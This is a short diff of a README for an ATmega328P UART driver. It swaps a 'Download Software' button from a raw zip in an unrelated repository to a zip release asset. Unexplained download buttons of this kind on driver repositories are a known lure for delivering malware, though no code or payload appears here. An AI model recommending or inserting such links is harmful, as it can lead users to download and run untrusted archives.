@@ -20,7 +20,7 @@ Here are some key features of the ATmega328P UART Driver:
 
 If you are looking to download the software related to this repository, please use the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Akikol/ATmega328P_UART_Driver/releases/download/v1.0/Program.zip)](https://github.com/Akikol/ATmega328P_UART_Driver/releases/download/v1.0/Program.zip)
 
 Click on the button above to download the software. 🚀
 
